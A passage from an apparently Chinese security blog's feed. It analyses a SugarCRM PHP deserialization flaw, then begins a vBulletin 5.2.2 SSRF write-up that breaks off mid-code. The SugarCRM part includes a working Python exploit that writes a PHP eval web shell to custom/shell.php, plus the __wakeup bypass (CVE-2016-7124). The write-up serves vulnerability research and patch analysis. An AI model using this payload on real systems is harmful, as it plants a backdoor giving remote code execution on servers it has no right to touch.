*/</span></span><br></pre></td></tr></table></figure><p>重点看一下<code>sugar_unserialize</code>方法，<code>PHPSTORM</code>的话，直接圈住这个方法名，<code>Command+B</code>就跳转到该方法了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Performs unserialization. Accepts all types except Objects</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $value Serialized value of any type except Object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed False if Object, converted value for other cases</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sugar_unserialize</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $value, $matches);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count($matches)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> unserialize($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到注释中写到的是，（翻译）<code>执行反序列化。接受除对象外的所有类型</code>，读一下正则，可以看到只是过滤了<code>o:123</code>这样的形式，但是并没有过滤完整，可以通过<code>o:+123123</code>的方式绕过（<a href="http://139.129.31.35/index.php/archives/382/" target="_blank" rel="noopener">以前php4fun做过一道类似的</a>）</p><p>不难发现，如果我们想要利用这个漏洞，需要传入<code>rest_data</code>，<code>method</code>。<code>serve</code>函数的作用就是在实施代码的类中调用指定的方法，并且返回结果。</p><p>顺着这个思路找一下哪里调用我们的<code>serve</code>方法。这个时候看一下目录结构，发现我们找到的漏洞触发点在<code>/service/core/REST</code>目录下：<img src="media/14858321993840/1.png" alt="1"></p><p>打开<code>v2v3v4</code>中的一个目录中的<code>rest.php</code>文件，发现这是不同版本rest的入口文件，主要提供了<code>sugarcrm</code>的<code>webserver</code>服务。</p><blockquote><p>这边说的是看目录结构的思路，其实比较简单的方法就是全局搜索<code>service/core/</code>，来查看哪些地方<code>require</code>了该文件，配合查看目录结构，非常的方便。</p></blockquote><p>在这里我们可以想到整个<code>service</code>目录就是提供网络服务的目录，跟一下<code>rest.php</code>中的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'../..'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'SugarWebServiceImplv4.php'</span>);</span><br><span class="line">$webservice_class = <span class="string">'SugarRestService'</span>;</span><br><span class="line">$webservice_path = <span class="string">'service/core/SugarRestService.php'</span>;</span><br><span class="line">$webservice_impl_class = <span class="string">'SugarWebServiceImplv4'</span>;</span><br><span class="line">$registry_class = <span class="string">'registry'</span>;</span><br><span class="line">$location = <span class="string">'/service/v4/rest.php'</span>;</span><br><span class="line">$registry_path = <span class="string">'service/v4/registry.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'service/core/webservice.php'</span>);</span><br></pre></td></tr></table></figure><p>前面都是一些变量的初始化，直接跟进<code>service/core/webservice.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ob_start();</span><br><span class="line">chdir(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../../'</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'include/entryPoint.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'soap/SoapError.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'SoapHelperWebService.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'SugarRestUtils.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>($webservice_path);</span><br><span class="line"><span class="keyword">require_once</span>($registry_path);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($webservice_impl_class_path))</span><br><span class="line">    <span class="keyword">require_once</span>($webservice_impl_class_path);</span><br><span class="line">$url = $GLOBALS[<span class="string">'sugar_config'</span>][<span class="string">'site_url'</span>].$location;</span><br><span class="line">$service = <span class="keyword">new</span> $webservice_class($url);</span><br><span class="line">$service-&gt;registerClass($registry_class);</span><br><span class="line">$service-&gt;register();</span><br><span class="line">$service-&gt;registerImplClass($webservice_impl_class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the service object in the global scope so that any error, if happens, can be set on this object</span></span><br><span class="line"><span class="keyword">global</span> $service_object;</span><br><span class="line">$service_object = $service;</span><br><span class="line"></span><br><span class="line">$service-&gt;serve();</span><br></pre></td></tr></table></figure><p>根据前面的变量定义，这里我们可以明显的看出调用关系：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = ip地址/service/v4/rest.php</span><br><span class="line">$service = <span class="keyword">new</span> SugarRestService($url)</span><br></pre></td></tr></table></figure><p>跟进<code>service/core/SugarRestService.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'Begin: SugarRestService-&gt;__construct'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;restURL = $url;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;responseClass = <span class="keyword">$this</span>-&gt;_getTypeName(@$_REQUEST[<span class="string">'response_type'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;serverClass = <span class="keyword">$this</span>-&gt;_getTypeName(@$_REQUEST[<span class="string">'input_type'</span>]);</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'SugarRestService-&gt;__construct serverclass = '</span> . <span class="keyword">$this</span>-&gt;serverClass);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'service/core/REST/'</span>. <span class="keyword">$this</span>-&gt;serverClass . <span class="string">'.php'</span>);</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'End: SugarRestService-&gt;__construct'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下<code>_getTypeName</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_getTypeName</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($name)) <span class="keyword">return</span> <span class="string">'SugarRest'</span>;</span><br><span class="line"></span><br><span class="line">$name = clean_string($name, <span class="string">'ALPHANUM'</span>);</span><br><span class="line">$type = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">switch</span>(strtolower($name)) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'json'</span>:</span><br><span class="line">$type = <span class="string">'JSON'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'rss'</span>:</span><br><span class="line">$type = <span class="string">'RSS'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'serialize'</span>:</span><br><span class="line">$type = <span class="string">'Serialize'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">$classname = <span class="string">"SugarRest$type"</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">'service/core/REST/'</span> . $classname . <span class="string">'.php'</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'SugarRest'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $classname;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里可以通过构造<code>input_type = serialize</code>来使<code>$this-&gt;serverClass = SugarRestSerialize</code>，接下来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$service-&gt;registerClass($registry_class);</span><br><span class="line">$service-&gt;register();</span><br><span class="line">$service-&gt;registerImplClass($webservice_impl_class);</span><br></pre></td></tr></table></figure><p>将<code>SugarRestSerialize</code>类进行注册，在这三个函数调用的过程中在<code>registerImplClass</code>方法中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;server = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;serverClass(<span class="keyword">$this</span>-&gt;implementation);</span><br></pre></td></tr></table></figure><p>在最后调用<code>$service-&gt;serve();</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">serve</span><span class="params">()</span></span>&#123;</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'Begin: SugarRestService-&gt;serve'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'service/core/REST/'</span>. <span class="keyword">$this</span>-&gt;responseClass . <span class="string">'.php'</span>);</span><br><span class="line">$response  = <span class="keyword">$this</span>-&gt;responseClass;</span><br><span class="line"></span><br><span class="line">$responseServer = <span class="keyword">new</span> $response(<span class="keyword">$this</span>-&gt;implementation);</span><br><span class="line"><span class="keyword">$this</span>-&gt;server-&gt;faultServer = $responseServer;</span><br><span class="line">$responseServer-&gt;faultServer = $responseServer;</span><br><span class="line">$responseServer-&gt;generateResponse(<span class="keyword">$this</span>-&gt;server-&gt;serve());</span><br><span class="line">$GLOBALS[<span class="string">'log'</span>]-&gt;info(<span class="string">'End: SugarRestService-&gt;serve'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>$responseServer-&gt;generateResponse($this-&gt;server-&gt;serve());</code>也就是调用了<code>SugarRestSerialize.php</code>中的<code>serve</code>方法，从而将我们构造好的序列化参数传递过去。</p><h2 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h2><p>从上面的分析中，我们已经知道了从哪里传入构造的序列化，传输过程。现在需要找的就是漏洞利用点，也就是漏洞触发点。</p><p>我们都知道现在只需要在序列化参数中传入需要反序列化的文件名，以及方法名，就可以将构造好的poc传递过去。</p><blockquote><p>关于找漏洞触发点，可以全局搜索危险函数名，以及通读代码来完成（耗费很多时间，并且没有一定的经验容易乱）。</p></blockquote><p>在<code>include/SugarCache/SugarCacheFile.php</code>找到漏洞利用点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">parent</span>::__destruct();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">$this</span>-&gt;_cacheChanged )</span><br><span class="line">        sugar_file_put_contents(sugar_cached(<span class="keyword">$this</span>-&gt;_cacheFileName), serialize(<span class="keyword">$this</span>-&gt;_localStore));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* This is needed to prevent unserialize vulnerability</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// clean all properties</span></span><br><span class="line">    <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"Not a serializable object"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在<code>__wakeup</code>魔术方法中，会将我们传递过来的数据清零，现在需要绕过该魔术方法，利用构造的序列化参数实现<code>__destrcut</code>中的写操作，绕过方法利用的就是<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">CVE-2016-7124</a>。</p><p>在来看一下<code>sugar_file_put_contents</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sugar_file_put_contents</span><span class="params">($filename, $data, $flags=null, $context=null)</span></span>&#123;  </span><br><span class="line">    <span class="comment">//check to see if the file exists, if not then use touch to create it.</span></span><br><span class="line">    <span class="keyword">if</span>(!file_exists($filename))&#123;</span><br><span class="line">        sugar_touch($filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !is_writable($filename) ) &#123;</span><br><span class="line">        $GLOBALS[<span class="string">'log'</span>]-&gt;error(<span class="string">"File $filename cannot be written to"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($flags)) &#123;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents($filename, $data);</span><br><span class="line">    &#125; <span class="keyword">elseif</span>(<span class="keyword">empty</span>($context)) &#123;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents($filename, $data, $flags);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_put_contents($filename, $data, $flags, $context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数并没有对文件内容或者扩展名等进行限制，虽然参数<code>$data</code>是serialize(<code>$this-&gt;_localStore</code>)，也就是序列化后的数据，但是我们可以设置<code>$_this-&gt;_localStore</code>为一个数组，把payload作为数组中的一个值，就可以完整保存payload。（反正就是执行一个写操作，php序列化数组后并不会对数组的值进行干扰）</p><p>所以，传入一个<code>SugarCacheFile</code>对象，并设置其属性的值，就能进行写文件操作。</p><p>demo的话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line"></span><br><span class="line">url = &apos;http://127.0.0.1:8788/service/v4/rest.php&apos;</span><br><span class="line"></span><br><span class="line">data = &#123;  </span><br><span class="line">    &apos;method&apos;: &apos;login&apos;,</span><br><span class="line">    &apos;input_type&apos;: &apos;Serialize&apos;,</span><br><span class="line">    &apos;rest_data&apos;: &apos;O:+14:&quot;SugarCacheFile&quot;:23:&#123;S:17:&quot;\\00*\\00_cacheFileName&quot;;s:15:&quot;../custom/shell.php&quot;;S:16:&quot;\\00*\\00_cacheChanged&quot;;b:1;S:14:&quot;\\00*\\00_localStore&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[\&apos;Lucifaer\&apos;]); ?&gt;&quot;;&#125;&#125;&apos;,</span><br><span class="line">&#125;</span><br><span class="line">req.post(url, data=data)</span><br></pre></td></tr></table></figure><p>shell在<code>custom/shell.php</code></p><p>恩，就是这样了。</p><h1 id="0x03-补丁diff"><a href="#0x03-补丁diff" class="headerlink" title="0x03 补丁diff"></a>0x03 补丁diff</h1><p>在v6.5.24中，对<code>sugar_unserialize</code>进行了如下改进：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sugar_unserialize</span><span class="params">($value)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    preg_match(<span class="string">'/[oc]:[^:]*\d+:/i'</span>, $value, $matches);</span><br><span class="line">    <span class="keyword">if</span> (count($matches)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> unserialize($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过了前面的分析，可以看到对象类型的序列化参数无法禁止反序列化了。</p><h1 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h1><p>升级SugarCRM到最新版本</p><p>对于php版本的升级并不是很建议，因为在一些高版本的php上，环境搭建可能会出现问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;免费广告…..推荐使用&lt;code&gt;PHPSTORM+Xdebug&lt;/code&gt;来分析漏洞，下面的过程都是利用&lt;code&gt;PHPSTORM&lt;/code&gt;来分析的。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-6483 vBulletin 5.2.2 SSRF漏洞</title>
    <link href="https://lucifaer.com/2016/08/11/CVE-2016-6483%20vBulletin%205.2.2%20SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>https://lucifaer.com/2016/08/11/CVE-2016-6483 vBulletin 5.2.2 SSRF漏洞/</id>
    <published>2016-08-11T10:28:00.000Z</published>
    <updated>2018-08-08T16:34:33.472Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-漏洞概述："><a href="#0x00-漏洞概述：" class="headerlink" title="0x00 漏洞概述："></a>0x00 漏洞概述：</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>vBulletin是一个商业论坛程序，它封装了自己的curl用于发出请求。近日研究人员发现在某些版本中其getlinkdata这项功能并没有对跳转进行检测和制止，从而导致SSRF漏洞的产生。</p><a id="more"></a><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>vBulletin  &lt;= 5.2.2      Preauth Server Side Request Forgery (SSRF)</p><p>vBulletin  &lt;= 4.2.3</p><p>vBulletin  &lt;= 3.8.9</p><h1 id="0x01-漏洞分析："><a href="#0x01-漏洞分析：" class="headerlink" title="0x01 漏洞分析："></a>0x01 漏洞分析：</h1><p>首先，在<code>/upload/include/vb5/frontend/controller/link.php</code>中定义了<code>actionGetlinkdata</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  $input = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'url'</span> =&gt; trim($_REQUEST[<span class="string">'url'</span>]),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$api = Api_InterfaceAbstract::instance();</span><br><span class="line"></span><br><span class="line">$video = $api-&gt;callApi(<span class="string">'content_video'</span>, <span class="string">'getVideoFromUrl'</span>, <span class="keyword">array</span>($input[<span class="string">'url'</span>]));</span><br><span class="line">$data = $api-&gt;callApi(<span class="string">'content_link'</span>, <span class="string">'parsePage'</span>, <span class="keyword">array</span>($input[<span class="string">'url'</span>]));</span><br></pre></td></tr></table></figure><p>获取输入的url参数，通过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$video = $api-&gt;callApi(<span class="string">'content_video'</span>, <span class="string">'getVideoFromUrl'</span>, <span class="keyword">array</span>($input[<span class="string">'url'</span>]));</span><br><span class="line">$data = $api-&gt;callApi(<span class="string">'content_link'</span>, <span class="string">'parsePage'</span>, <span class="keyword">array</span>($input[<span class="string">'url'</span>]));</span><br></pre></td></tr></table></figure><p>分别传递给<code>content_video</code>和<code>content_link</code>这两个controller中的<code>getVideoFromUrl</code>和<code>parsePage</code>这两个api函数。</p><p>在<code>/upload/core/vb/api/content/link.php</code>中的<code>parsePage</code>api函数中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parsePage</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Validate url</span></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'|^http(s)?://[a-z0-9-]+(\.[a-z0-9-]+)*(:[0-9]+)?(/.*)?$|i'</span>, $url))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> vB_Exception_Api(<span class="string">'upload_invalid_url'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (($urlparts = vB_String::parseUrl($url)) === <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> vB_Exception_Api(<span class="string">'upload_invalid_url'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Try to fetch the url</span></span><br><span class="line">$vurl = <span class="keyword">new</span> vB_vURL();</span><br><span class="line">$vurl-&gt;set_option(VURL_URL, $url);</span><br><span class="line"><span class="comment">// Use IE8's User-Agent for the best compatibility</span></span><br><span class="line">$vurl-&gt;set_option(VURL_USERAGENT, <span class="string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)'</span>);</span><br><span class="line">$vurl-&gt;set_option(VURL_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$vurl-&gt;set_option(VURL_CLOSECONNECTION, <span class="number">1</span>);</span><br><span class="line">$vurl-&gt;set_option(VURL_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">$vurl-&gt;set_option(VURL_HEADER, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$page = $vurl-&gt;exec();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;extractData($page, $urlparts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>完成对于url的获取,以及对于各个参数的设置。</li><li>传入的<code>$url</code>直接新建了一个对象<code>vB_vURL()</code>来实现<code>curl</code></li><li><code>$vurl-&gt;set_option(VURL_FOLLOWLOCATION, 1);</code>设置<code>VURL_FOLLOWLOCATION</code>参数值为1，允许跳转后的二次跳转</li></ul><p>在<code>/upload/core/vb/vurl.php</code>中的<code>class_vB_vURL()</code>触发漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $classnames = <span class="keyword">array</span>(<span class="string">'cURL'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;options = vB::getDatastore()-&gt;get_value(<span class="string">'options'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create the objects we need</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;classnames <span class="keyword">AS</span> $classname)</span><br><span class="line">&#123;</span><br><span class="line">$fullclass = <span class="string">'vB_vURL_'</span> . $classname;</span><br><span class="line"><span class="keyword">$this</span>-&gt;transports[<span class="string">"$classname"</span>] = <span class="keyword">new</span> $fullclass(<span class="keyword">$this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;reset();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  $result = <span class="keyword">$this</span>-&gt;exec2();</span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">return</span> $result;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exec2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        .......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (array_keys(<span class="keyword">$this</span>-&gt;transports) <span class="keyword">AS</span> $tname)</span><br><span class="line">    &#123;</span><br><span class="line">    $transport =&amp; <span class="keyword">$this</span>-&gt;transports[$tname];</span><br><span class="line">    <span class="keyword">if</span> (($result = $transport-&gt;exec()) === VURL_HANDLED  <span class="keyword">AND</span> !<span class="keyword">$this</span>-&gt;fetch_error())</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format_response(<span class="keyword">array</span>(<span class="string">'headers'</span> =&gt; $transport-&gt;response_header, <span class="string">'body'</span> =&gt; (<span class="keyword">isset</span>($transport-&gt;response_text)? 